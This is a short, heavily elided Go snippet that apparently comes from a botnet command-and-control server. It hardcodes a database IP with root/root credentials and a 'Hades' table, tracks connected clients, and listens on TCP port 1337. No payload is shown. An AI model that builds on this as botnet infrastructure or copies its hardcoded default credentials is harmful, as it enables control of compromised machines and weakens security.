...
const DatabaseAddr string   = "178.156.202.7:3306"
const DatabaseUser string   = "root"
const DatabasePass string   = "root"
const DatabaseTable string  = "Hades"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    tel, err := net.Listen("tcp", "178.156.202.7:1337")
    if err != nil {
        fmt.Println(err)
        return
    }
    ...
    fmt.Println("ERROR! Try ~> ulimit -n 999999")
}
